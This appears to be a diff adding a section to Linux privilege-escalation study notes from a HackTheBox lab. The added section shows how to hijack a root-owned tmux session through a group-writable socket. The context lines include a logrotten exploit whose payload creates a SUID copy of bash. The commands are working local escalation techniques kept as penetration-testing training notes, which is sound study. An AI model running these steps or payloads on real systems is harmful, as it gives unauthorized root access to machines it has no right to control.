@@ -1150,3 +1150,22 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > payload
 echo "trigger rotation" >> path_of_writable_log_file
 ./logrotten -p payloadfile /home/htb-student/backups/access.log
 ```
+###### Hijacking Tmux Session
+Prerequisites
+```
+1. There is already a tmux process running by root like below
+ps aux | grep tmux
+
+root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
+
+2. Current User or user's group has write permission over tmux session: /shareds
+htb@NIX02:~$ ls -la /shareds 
+srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
+
+htb@NIX02:~$ id
+uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
+```
+Exploit
+```
+tmux -S /shareds
+```
